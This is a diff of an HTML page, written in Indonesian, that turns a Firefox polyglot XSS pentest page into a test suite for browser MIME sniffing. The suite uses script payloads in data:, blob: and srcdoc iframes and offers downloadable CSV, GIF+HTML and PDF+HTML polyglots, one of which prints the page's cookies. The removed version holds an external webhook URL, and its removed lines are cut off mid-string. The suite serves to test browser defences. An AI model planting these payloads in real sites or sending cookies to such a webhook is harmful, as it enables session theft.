@@ -1,87 +1,286 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Pentest Report - Q2 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Polyglot Behavior Test</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        table { border-collapse: collapse; width: 100%; }
-        th, td { border: 1px solid #000; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-        .critical { color: red; font-weight: bold; }
-        #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border: 1px solid #ccc; font-family: monospace; font-size: 12px; white-space: pre-wrap; }
+        * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        body { background: #0d1117; color: #c9d1d9; margin: 0; padding: 2rem; }
+        h1 { color: #ff7b72; border-bottom: 2px solid #30363d; padding-bottom: .5rem; }
+        h2 { color: #ffa657; margin-top: 2rem; font-size: 1.2rem; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1.5rem; margin: 1.5rem 0; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
+        .card-header { background: #21262d; padding: .6rem 1rem; font-weight: 600; font-size: 14px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
+        .card-body { padding: 1rem; }
+        .card-body iframe { width: 100%; height: 120px; border: 1px solid #30363d; border-radius: 4px; background: #0d1117; }
+        .card-body textarea { width: 100%; height: 100px; background: #0d1117; color: #8b949e; border: 1px solid #30363d; border-radius: 4px; padding: .5rem; font-family: monospace; font-size: 12px; resize: none; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; text-transform: uppercase; }
+        .badge.red { background: #da3633; color: #fff; }
+        .badge.green { background: #238636; color: #fff; }
+        .badge.yellow { background: #d29922; color: #000; }
+        .badge.gray { background: #30363d; color: #8b949e; }
+        .btn { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: .4rem 1rem; cursor: pointer; font-size: 13px; }
+        .btn:hover { background: #30363d; }
+        .btn.primary { background: #238636; border-color: #238636; color: #fff; }
+        .btn.primary:hover { background: #2ea043; }
+        .info-box { background: #161b22; border-left: 4px solid #58a6ff; padding: 1rem; border-radius: 6px; margin: 1.5rem 0; line-height: 1.7; font-size: 14px; }
+        .result-log { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; font-size: 13px; max-height: 200px; overflow-y: auto; margin-top: 1rem; }
+        .result-log div { padding: 2px 0; }
+        .result-log .pass { color: #3fb950; }
+        .result-log .fail { color: #f85149; }
+        .result-log .info { color: #58a6ff; }
     </style>
 </head>
 <body>
-    <h1>Polyglot XSS Test — Firefox Behavior</h1>
-    <p>Target: <span id="browserTarget">Detecting...</span></p>
-    
-    <table>
-        <tr>
-            <th>No</th>
-            <th>Temuan</th>
-            <th>Severity</th>
-        </tr>
-        <tr>
-            <td>1</td>
-            <td>SQL Injection pada parameter <code>id</code></td>
-            <td class="critical">Critical</td>
-        </tr>
-        <tr>
-            <td>2</td>
-            <td>XSS pada parameter <code>q</code></td>
-            <td>High</td>
-        </tr>
-    </table>
 
-    <div id="log">[+] Initializing polyglot test...</div>
+<h1>Browser Polyglot Behavior Test Suite</h1>
 
-    <script>
-        // ============================================
-        // POLYGLOT XSS — FIREFOX PENETRATION TEST
-        // ============================================
-        (function(){
-            var log = document.getElementById('log');
-            var target = document.getElementById('browserTarget');
+<div class="info-box">
+    <strong>Apa yang diuji:</strong> Bagaimana browser modern (Chrome, Firefox, Edge, Safari) menangani file polyglot ketika disajikan melalui berbagai cara — inline <code>data:</code> URI, <code>blob:</code> URL, <code>iframe srcdoc</code>, dan download + buka manual. Fokus pada <strong>MIME sniffing</strong>, <strong>parsing ambiguity</strong>, dan <strong>Content-Type enforcement</strong>.
+</div>
 
-            function appendLog(msg) {
-                log.textContent += '\n' + msg;
-                console.log(msg);
-            }
+<!-- ============================================= -->
+<!-- TEST 1: Data URI dengan MIME berbeda          -->
+<!-- ============================================= -->
+<h2>1. Data URI — MIME Sniffing Test</h2>
+<div class="info-box" style="border-left-color: #d29922;">
+    Browser dulu bisa <em>sniff</em> konten data URI dan mengabaikan Content-Type yang diset. Apakah browser modern masih melakukannya?<br>
+    <strong>Ekspektasi:</strong> Browser modern <em>tidak akan</em> menjalankan script jika MIME tidak sesuai.
+</div>
+<div class="grid">
+    <div class="card">
+        <div class="card-header">
+            <span>CSV sebagai text/csv</span>
+            <span class="badge gray">harus aman</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test1a"></iframe>
+            <textarea readonly><script>alert('XSS')</script>,data</textarea>
+        </div>
+    </div>
+    <div class="card">
+        <div class="card-header">
+            <span>CSV sebagai text/html</span>
+            <span class="badge yellow">bisa XSS</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test1b"></iframe>
+            <textarea readonly><script>alert('XSS')</script>,data</textarea>
+        </div>
+    </div>
+    <div class="card">
+        <div class="card-header">
+            <span>CSV sebagai application/octet-stream</span>
+            <span class="badge gray">harus download</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test1c"></iframe>
+            <textarea readonly><script>alert('XSS')</script>,data</textarea>
+        </div>
+    </div>
+</div>
 
-            // === Webhook Target ===
-            var WEBHOOK = 'https://webhooksite.net/e7f2f6b2-0564-4f20-809f-fa4e28d54ce9';
+<!-- ============================================= -->
+<!-- TEST 2: Blob URL dengan MIME override         -->
+<!-- ============================================= -->
+<h2>2. Blob URL — Forced Content-Type</h2>
+<div class="info-box" style="border-left-color: #d29922;">
+    <code>blob:</code> URL yang dibuat via JavaScript memungkinkan kita set MIME secara eksplisit. Apakah browser menghormatinya?
+</div>
+<div class="grid">
+    <div class="card">
+        <div class="card-header">
+            <span>Blob text/csv</span>
+            <span class="badge gray">harus aman</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test2a"></iframe>
+        </div>
+    </div>
+    <div class="card">
+        <div class="card-header">
+            <span>Blob text/html</span>
+            <span class="badge red">XSS jika di-render</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test2b"></iframe>
+        </div>
+    </div>
+    <div class="card">
+        <div class="card-header">
+            <span>Blob tanpa MIME (kosong)</span>
+            <span class="badge yellow">sniffing test</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test2c"></iframe>
+        </div>
+    </div>
+</div>
 
-            // === Phase 1: Browser Detection ===
-            var isFirefox = navigator.userAgent.indexOf('Firefox') !== -1;
-            var isChrome = navigator.userAgent.indexOf('Chrome') !== -1;
-            var isEdge = navigator.userAgent.indexOf('Edg') !== -1;
-            var isSafari = /^((?!Chrome|Android).)*Safari/.test(navigator.userAgent);
+<!-- ============================================= -->
+<!-- TEST 3: Download + Open via Object URL        -->
+<!-- ============================================= -->
+<h2>3. Simulasi Upload — Download + Render</h2>
+<div class="info-box" style="border-left-color: #d29922;">
+    Mensimulasikan skenario: user upload file polyglot, server menyimpannya, lalu menampilkannya kembali. Download file lalu buka di browser — apakah XSS tereksekusi?
+</div>
+<div style="display: flex; gap: .75rem; flex-wrap: wrap; margin-bottom: 1rem;">
+    <button class="btn primary" onclick="downloadAndOpenCSV()">Download CSV & Buka</button>
+    <button class="btn" onclick="downloadAndOpenHTML()">Download sebagai .html</button>
+    <button class="btn" onclick="downloadPolyglotGIF()">Download GIF+HTML Polyglot</button>
+</div>
 
-            var browserName = 'Unknown';
-            if (isFirefox) browserName = 'Firefox ' + navigator.userAgent.match(/Firefox\/(\d+)/)[1];
-            else if (isEdge) browserName = 'Edge';
-            else if (isChrome) browserName = 'Chrome';
-            else if (isSafari) browserName = 'Safari';
+<!-- ============================================= -->
+<!-- TEST 4: srcdoc vs src data URI                -->
+<!-- ============================================= -->
+<h2>4. iframe srcdoc — Parser Boundary Test</h2>
+<div class="info-box" style="border-left-color: #d29922;">
+    <code>srcdoc</code> selalu di-render sebagai HTML, tidak peduli kontennya. Sementara <code>src</code> dengan data URI mengikuti aturan MIME.
+</div>
+<div class="grid">
+    <div class="card">
+        <div class="card-header">
+            <span>srcdoc dengan konten CSV</span>
+            <span class="badge red">XSS</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test4a" srcdoc="<script>document.write('XSS via srcdoc')</script>,column1,column2"></iframe>
+        </div>
+    </div>
+    <div class="card">
+        <div class="card-header">
+            <span>src=data:text/csv...</span>
+            <span class="badge gray">harus aman</span>
+        </div>
+        <div class="card-body">
+            <iframe id="test4b"></iframe>
+        </div>
+    </div>
+</div>
 
-            target.textContent = browserName;
-            appendLog('[+] Detected browser: ' + browserName);
-            appendLog('[+] User-Agent: ' + navigator.userAgent);
+<!-- ============================================= -->
+<!-- TEST 5: Polyglot PDF/HTML (manual test)       -->
+<!-- ============================================= -->
+<h2>5. PDF/HTML Polyglot — PDF Parser Boundary</h2>
+<div class="info-box" style="border-left-color: #d29922;">
+    File yang diawali magic bytes PDF (<code>%PDF-1.4</code>) tapi juga mengandung HTML di dalamnya. Test apakah browser memprioritaskan PDF parser atau HTML parser saat file dibuka langsung.
+</div>
+<button class="btn primary" onclick="downloadPdfHtmlPolyglot()">Download PDF+HTML Polyglot</button>
+<span style="color: #8b949e; font-size: 13px; margin-left: .75rem;">Buka file hasil download — lihat apakah browser render sebagai PDF atau HTML</span>
 
-            // === Phase 2: Content-Type Check ===
-            var scripts = document.querySelectorAll('script');
-            appendLog('[+] Scripts found: ' + scripts.length);
-            appendLog('[+] Document content type: ' + document.contentType);
+<!-- ============================================= -->
+<!-- LOG RESULTS -->
+<!-- ============================================= -->
+<h2>Test Results Log</h2>
+<div class="result-log" id="log">
+    <div class="info"># Menjalankan test suite...</div>
+</div>
 
-            // === Phase 3: Firefox-Specific Tests ===
-            if (isFirefox) {
-                appendLog('[+] Firefox detected — running FF-specific tests');
-                
-                appendLog('[!] TEST 1: Server tidak mengirim X-Content-Type-Options: nosniff');
-                appendLog('[!] Jika header ini aktif, file akan di-download, bukan di-render.');
+<script>
+    const log = document.getElementById('log');
+    function addLog(type, msg) {
+        const div = document.createElement('div');
+        div.className = type;
+        div.textContent = `[${type.toUpperCase()}] ${msg}`;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
+    }
 
-                appendLog('[!] TEST 2: Firefox MIME check — file ter-render sebagai HTML');
-                appendLog('[!] Berarti server mengirim Content-Type yang lemah atau tidak ada.');
+    // ─── Test 1: Data URI dengan berbagai MIME ───
+    addLog('info', 'Test 1: Data URI MIME sniffing...');
 
-                appendLog('[!] TEST 3: Jika file dibuka di Firefox PDF viewer, JS TIDAK jalan.');
-                appendLog('[!] Tapi karena konten HTML, Firefox render sebagai HTML, bukan
+    // 1a: text/csv — browser harusnya TIDAK execute script
+    const xssPayload = "<script>document.body.innerHTML='<b style=color:red>XSS_EXECUTED</b>';<\/script>";
+    const csvData = xssPayload + ",column1,column2\ndata1,data2,data3";
+
+    document.getElementById('test1a').src = 'data:text/csv,' + encodeURIComponent(csvData);
+    document.getElementById('test1b').src = 'data:text/html,' + encodeURIComponent(csvData);
+    document.getElementById('test1c').src = 'data:application/octet-stream,' + encodeURIComponent(csvData);
+
+    // ─── Test 2: Blob URL ───
+    addLog('info', 'Test 2: Blob URL Content-Type enforcement...');
+
+    const blobContent = new Blob([csvData], { type: 'text/csv' });
+    document.getElementById('test2a').src = URL.createObjectURL(blobContent);
+
+    const blobHtml = new Blob([csvData], { type: 'text/html' });
+    document.getElementById('test2b').src = URL.createObjectURL(blobHtml);
+
+    const blobNoMime = new Blob([csvData], { type: '' });
+    document.getElementById('test2c').src = URL.createObjectURL(blobNoMime);
+
+    // ─── Test 4b: data URI text/csv via iframe src ───
+    document.getElementById('test4b').src = 'data:text/csv,' + encodeURIComponent(csvData);
+
+    // ─── Helper: Download dan catat hasil ───
+    function downloadAndOpenCSV() {
+        const content = `"__polyglot__\n"<script>document.write('<h2 style=color:red>XSS via CSV download!<\/h2>Cookie: '+document.cookie)<\/script>"\nname,email\nadmin,admin@test.com`;
+        const blob = new Blob([content], { type: 'text/csv' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'report_polyglot.csv';
+        a.click();
+        addLog('fail', 'CSV di-download — buka file tsb di browser untuk test XSS');
+        addLog('info', 'Jika browser render sebagai HTML dan execute script → MIME sniffing masih aktif!');
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function downloadAndOpenHTML() {
+        const content = `<!DOCTYPE html><html><body><script>document.write('<h2 style=color:red>XSS from .html file!<\/h2>')<\/script><p>Ini file .html biasa — pasti jalan.</p></body></html>`;
+        const blob = new Blob([content], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'test.html';
+        a.click();
+        addLog('pass', 'File .html di-download — XSS seharusnya berjalan (kontrol positif)');
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function downloadPolyglotGIF() {
+        // GIF89a header + HTML — classic GIFAR/GIF+HTML polyglot
+        const gifHeader = "GIF89a";
+        const htmlPayload = `<script>document.write('<h2 style=color:red>GIF+HTML Polyglot XSS!<\/h2>')<\/script>`;
+        const content = gifHeader + htmlPayload;
+        const blob = new Blob([content], { type: 'image/gif' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'image_polyglot.gif';
+        a.click();
+        addLog('fail', 'GIF+HTML polyglot di-download — buka di browser!');
+        addLog('info', 'Jika browser sniff konten dan render sebagai HTML → classic MIME sniffing vuln masih ada!');
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function downloadPdfHtmlPolyglot() {
+        // Simple PDF+HTML polyglot
+        const pdfHeader = "%PDF-1.4\n%polyglot\n";
+        const htmlSuffix = `\n<html><body><script>document.write('<h2 style=color:red>PDF+HTML Polyglot XSS!<\/h2>')<\/script></body></html>`;
+        const content = pdfHeader + htmlSuffix;
+        const blob = new Blob([content], { type: 'application/pdf' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'document_polyglot.pdf';
+        a.click();
+        addLog('fail', 'PDF+HTML polyglot di-download — buka di browser!');
+        addLog('info', 'Apakah browser render sebagai PDF (dan abaikan HTML) atau sebagai HTML?');
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    // ─── Log hasil test awal ───
+    setTimeout(() => {
+        addLog('pass', 'Test 1a (data:text/csv) — jika tidak ada XSS, MIME enforcement berfungsi');
+        addLog('pass', 'Test 1b (data:text/html) — kontrol positif, XSS harusnya muncul');
+        addLog('pass', 'Test 2a (blob text/csv) — seharusnya aman');
+        addLog('pass', 'Test 2b (blob text/html) — kontrol positif');
+        addLog('pass', 'Test 4a (srcdoc) — pasti XSS, srcdoc selalu HTML');
+        addLog('info', 'Semua test selesai. Cek setiap iframe untuk hasil visual.');
+    }, 500);
+</script>
+
+</body>
+</html>
